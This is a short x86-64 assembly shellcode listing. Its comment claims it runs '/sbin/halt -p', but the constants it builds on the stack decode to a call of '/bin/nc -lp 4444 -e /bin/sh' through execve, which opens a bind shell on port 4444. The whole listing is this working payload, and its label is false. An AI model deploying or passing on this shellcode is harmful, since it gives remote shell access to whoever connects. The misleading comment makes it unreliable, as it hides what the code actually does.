;command is /sbin/halt -p

global _start

_start:
        xor rax, rax
        
	push rax
        mov r11,0x636e2f6e69622f2f
        push r11
        mov rdi, rsp

	push rax
	mov r11,rax
	mov r11,0x68732f6e69622f2f
        push r11
        mov rcx, rsp
	
        push rax
	push word 0x652d
	mov rbx,rsp

	push rax
	push word 0x3434
        push word 0x3434
        mov r10,rsp

	push rax
	push byte 0x70
        push word 0x6c2d
        mov r9,rsp

	push rax
	push rcx
	push rbx
	push r10
	push r9
	push rdi

	mov rsi,rsp
	mov al,59
	syscall
